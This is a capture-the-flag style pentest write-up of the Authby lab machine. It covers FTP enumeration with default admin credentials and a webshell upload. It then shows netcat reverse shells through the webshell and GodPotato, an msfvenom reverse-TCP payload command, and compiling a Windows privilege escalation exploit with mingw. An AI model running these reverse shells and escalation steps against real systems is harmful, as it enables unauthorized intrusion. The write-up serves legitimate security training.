# Authby

## Pentest Report for Authby

### Basic Information

* **Box name**: Authby
* **IP address**: 192.168.169.46
* **Operating system**: Windows
* **Date**: 3/24/2025

### Pentest Phases

#### 1. Reconnaissance

* Initial Nmap scan: `nmap -sC -sV -oA initial 192.168.169.46`
* Full scan: `nmap -p- --min-rate 10000 -oA full 192.168.169.46`
* Service version verification

<figure><img src="../../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

#### 2. Enumeration

* Enumeration of users, groups, and other relevant information
* Search for known vulnerabilities for identified services

Ok so in our scan we got some interesting stuff, we're going to try and abuse one of the FTP services:

Ftp anonymous connection is enabled -> no interesting informations

I am able to connect as admin:

<figure><img src="../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

I download every files in the admin share and discover a hash:

<figure><img src="../../../.gitbook/assets/image (304).png" alt=""><figcaption><p>offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0</p></figcaption></figure>

#### 3. Exploitation

* Exploitation attempts of discovered vulnerabilities
* Initial access to the target

it's hashcat mode 1600:

<figure><img src="../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

another thing to note is when i connect with admin:admin i am able to upload php shell:

```
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||2064|)
150 File status okay; about to open data connection.
100% |*************************************************|  5496       23.29 MiB/s    00:00 ETA
226 Closing data connection.
5496 bytes sent in 00:00 (68.09 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||2065|)
150 Opening connection for /bin/ls.
total 9
-r--r--r--   1 root     root         5496 Mar 24 22:34 shell.php
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> 
```

but the php shell does not work so i upload nc exe and a php webshell and manage to get a webshell ->

```
http://192.168.169.46:242/webshell.php?cmd=whoami
```

So for my reverse shell i set up a listener and enter:

```
http://192.168.169.46:242/webshell.php?cmd=nc.exe+192.168.45.228+80+-e+cmd
```

and get my reverse shell

#### 4. Post-Exploitation

* Access persistence
* Privilege escalation
* Sensitive data extraction

After a quick whoami /priv i see that i have impersonate privileges so i start exploitation ->

God potato does not work:

```
.\GodPotato-NET4.exe -cmd "nc.exe -e cmd 192.168.45.228 9876"
```

I already had this issue so i'll use printspoofer:

and i got the error:

```
This version of C:\wamp\www\PrintSpoofer.exe is not compatible with the version of Windows you're running.
```

so i try juicy potato and start by uploading the executable and a shell.exe that i crafted:

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.228 -f exe -o shell.exe
```

after being very anoyed i tried another path, i looked at the os version:

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

and found something that seemed to suit the situation:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I had problems compiling the exploit:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

* The default `gcc` compiler on Linux does **not** include Windows headers by default.
* The missing file suggests that i'm trying to compile a Windows-based program on a Linux system without the necessary Windows libraries.

So i need to :\


* **Windows-compatible toolchain** like `i686-w64-mingw32-gcc`, which includes Windows headers.
* Alternatively, install Windows headers for Linux (`mingw-w64`)

And manage to compile the exploit:

```
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

and i just run the exploit and manage to get my shell:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 5. Cleanup

* Removal of artifacts from the target
* Documentation of vulnerabilities and exploitation methods
